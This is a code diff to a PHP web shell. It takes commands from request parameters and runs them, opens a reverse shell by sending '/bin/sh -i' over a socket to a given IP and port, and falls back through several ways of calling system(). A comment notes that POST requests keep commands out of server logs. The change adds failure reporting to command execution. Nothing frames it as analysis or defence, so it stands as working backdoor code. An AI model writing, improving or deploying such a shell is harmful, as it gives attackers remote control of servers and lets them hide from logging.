@@ -28,7 +28,11 @@ if (isset($_REQUEST[$cmd])) {
    // get  or post  parameter (post  don't display  the
    // command on apache logs)
    $command = $_REQUEST[$cmd];
-   executeCommand($command);
+
+   // notify on execution failure
+   if (!executeCommand($command)) {
+      echo 'The command failed to run';
+   }
    die();
 }
 
@@ -46,7 +50,10 @@ if (isset($_REQUEST[$ip]) && !isset($_REQUEST[$cmd])) {
    $sock    = fsockopen($ip, $port);
    $command = '/bin/sh -i <&3 >&3 2>&3';
 
-   executeCommand($command);
+   // notify on execution failure
+   if (!executeCommand($command)) {
+      echo 'The command failed to run';
+   }
 }
 
 die();
@@ -60,19 +67,19 @@ function executeCommand(string $command)
       // http://php.net/manual/en/class.reflectionfunction.php
       $function = new ReflectionFunction('system');
       $function->invoke($command);
-      return;
+      return true;
    }
 
    if (function_exists('call_user_func_array')) {
       // http://php.net/manual/en/function.call-user-func-array.php
       call_user_func_array('system', array($command));
-      return;
+      return true;
    }
 
    if (function_exists('call_user_func')) {
       // http://php.net/manual/en/function.call-user-func.php
       call_user_func('system', $command);
-      return;
+      return true;
    }
 
    if (function_exists('passthru')) {
@@ -90,6 +97,8 @@ function executeCommand(string $command)
       // :>
       // http://php.net/manual/en/function.system.php
       system($command);
-      return;
+      return true;
    }
+
+   return false;
 }
